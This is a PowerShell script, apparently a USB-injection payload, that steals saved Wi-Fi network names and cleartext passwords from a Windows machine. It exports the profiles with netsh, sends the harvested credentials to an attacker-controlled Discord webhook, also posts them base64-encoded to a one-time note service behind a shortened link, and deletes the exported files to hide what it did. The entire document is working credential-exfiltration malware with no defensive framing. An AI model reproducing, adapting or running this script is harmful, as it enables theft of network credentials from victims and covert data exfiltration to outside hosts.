param(
    [string]$UserName,
    [string]$hookurl,
    [string]$safeNote,
    [string]$shortUrl,
    [string]$apiKey,
	[string]$password
)
netsh wlan export profile key=clear | Out-Null
Get-ChildItem "Wi-Fi*.xml" | Rename-Item -NewName { "WiFi_" + $_.Name }
$wifiData = (Get-Content WiFi_*.xml | ForEach-Object { if ($_ -match '<name>([^<]+)</name>') { $name = $matches[1] }; if ($_ -match '<keyMaterial>([^<]+)</keyMaterial>') { $keyMaterial = $matches[1]; @{name=$name; pass=$keyMaterial} } } | ConvertTo-Json -Compress)
$fileToSend = $wifiData | Out-File -FilePath 'wifi-data.json' -Encoding UTF8
function Delete-FileAfterUpload {[CmdletBinding()] param ([parameter(Position=0,Mandatory=$True)][string]$file); if (Test-Path $file) {Remove-Item $file -ErrorAction SilentlyContinue}}
function Upload-Discord {[CmdletBinding()] param ([parameter(Position=0,Mandatory=$False)][string]$file,[parameter(Position=1,Mandatory=$False)][string]$text); $Body = @{'username' = $env:username; 'content' = $text}; if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)}; if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@${file}" $hookurl | Out-Null; Delete-FileAfterUpload -file $file}}
Upload-Discord -file 'wifi-data.json' -text "Wifi Data of: $env:username"
$base64Data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($wifiData))
del WiFi_*
$data = (@{"note"=$base64Data; "lifetime"="10"; "read_count"="1"; "password"=$password} | ConvertTo-Json -Compress)
$Response = Invoke-RestMethod -Method Post -Uri $safeNote -ContentType "application/json" -Body $data
if ($Response -and $Response.link) { $link = Invoke-RestMethod -Method Post -Uri $shortUrl -Headers @{"accept"="application/json"; "apikey"=$apiKey; "content-type"="application/json"} -Body (@{"destination"=$Response.link; "title"="Store Wifi Data"} | ConvertTo-Json -Compress); } else { Write-Output "Failed to get a valid link from SafeNote API." }
exit
